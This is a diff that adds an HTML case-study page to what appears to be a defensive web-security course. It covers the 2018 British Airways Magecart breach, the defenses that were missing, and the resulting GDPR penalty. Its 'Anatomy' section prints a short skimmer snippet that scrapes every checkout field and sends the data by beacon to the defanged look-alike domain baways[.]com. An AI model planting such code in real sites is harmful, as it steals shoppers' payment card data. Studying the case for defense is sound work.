@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Case Study — British Airways (2018)</title>
+<link rel="stylesheet" href="../../assets/lab.css">
+<link rel="stylesheet" href="../../module_16_cases/module.css">
+</head>
+<body>
+<nav class="nav">
+  <a href="/">◂ Lab home</a>
+  <a href="../../module_16_cases/">◂ Module 16 index</a>
+</nav>
+
+<p class="kicker">Module 16 · Case Study</p>
+<h1>British Airways — 2018 Magecart Breach</h1>
+<p class="lead">A concrete, consequential Magecart incident: roughly 22 lines of
+injected JavaScript skimmed around 380,000–430,000 payment-card records and led
+to one of the era's largest GDPR penalties. Small payload, enormous impact.</p>
+
+<h2>What happened</h2>
+<p>Attackers (a Magecart group) modified a JavaScript file that BA's website
+loaded — reporting at the time identified a customized Modernizr script on the
+payment path. The tampered script hooked the checkout form and, on submit, sent
+the entered card details to an attacker-controlled server whose domain
+(<code>baways[.]com</code>) was chosen to look BA-related. It also affected the
+mobile app, which loaded web components from the same compromised source. The
+skimmer ran for roughly two weeks before detection.</p>
+
+<h2>Anatomy (illustrative)</h2>
+<pre><code>// ~ the shape of the injected handler on the payment page
+$('#submitButton').bind('mouseup touchend', function(){
+  var data = {};
+  $('input[name]').each(function(){ data[this.name] = this.value; });   // scrape all fields
+  navigator.sendBeacon('https://baways[.]com/gateway/app/dataprocessing/api/',
+                       JSON.stringify(data));                            // exfiltrate
+});</code></pre>
+<p>Note how little is needed: one event binding, a field scrape, one beacon. This
+is Module 15's "same-origin JS owns the page" and Module 11's "phone home" in
+production form.</p>
+
+<h2>Mapping to the taxonomy</h2>
+<table>
+<thead><tr><th>Element</th><th>Course concept</th></tr></thead>
+<tbody>
+<tr><td>Tampered first-party-loaded script</td><td>Supply-chain script inclusion (no SRI)</td></tr>
+<tr><td>Runs same-origin on checkout</td><td>M15: full DOM/form access via origin trust</td></tr>
+<tr><td>Scrape inputs on submit</td><td>M09/M15 DOM access</td></tr>
+<tr><td><code>sendBeacon</code> to look-alike domain</td><td>M11 OOB exfiltration; evasion via plausible domain</td></tr>
+<tr><td>Web view in the app shares the code</td><td>Blast radius beyond the website</td></tr>
+</tbody>
+</table>
+
+<h2>The absent defenses (each would have helped)</h2>
+<div class="card">
+<ul>
+<li><strong>Subresource Integrity (SRI):</strong> an <code>integrity</code> hash
+on the loaded script would have caused the tampered file to be rejected by the
+browser.</li>
+<li><strong>Content Security Policy <code>connect-src</code>:</strong> restricting
+outbound connections to known hosts would have blocked the beacon to
+<code>baways[.]com</code>. CSP reporting could also have surfaced the anomaly.</li>
+<li><strong>Payment-field isolation (hosted fields / payment iframe on a separate
+origin):</strong> the Same-Origin Policy would have prevented first-party script
+from reading the card inputs at all — arguably the strongest architectural
+control for card data.</li>
+<li><strong>Script integrity monitoring / minimizing third-party code on payment
+pages:</strong> fewer, pinned, monitored scripts shrink the attack surface.</li>
+</ul>
+</div>
+
+<h2>The regulatory coda</h2>
+<p>The UK ICO initially signaled a very large fine (~£183m) and ultimately imposed
+£20m under GDPR, citing inadequate security measures. For a defender this reframes
+XSS/skimming from "a bug" to "a board-level financial and legal risk," which is
+exactly the framing that gets defensive research funded and deployed.</p>
+
+<h2>Lesson for defenders</h2>
+<p>BA 2018 is the definitive argument that <strong>the browser is the payment
+terminal</strong>, and that defending it requires <em>egress control + integrity
++ isolation</em>, not just input validation. Any Module 18 intervention aimed at
+this class should be evaluated on three axes: does it stop the script loading
+(integrity), stop it reading secrets (isolation), or stop it exfiltrating
+(egress/CSP)? Defenses that touch only one axis leave a viable attack path.</p>
+
+<footer>
+Module 16 · <a href="../../module_17_defenses/">Continue to Module 17: Defenses ▸</a><br>
+Figures are drawn from public post-incident reporting and the ICO penalty notice.
+</footer>
+</body>
+</html>
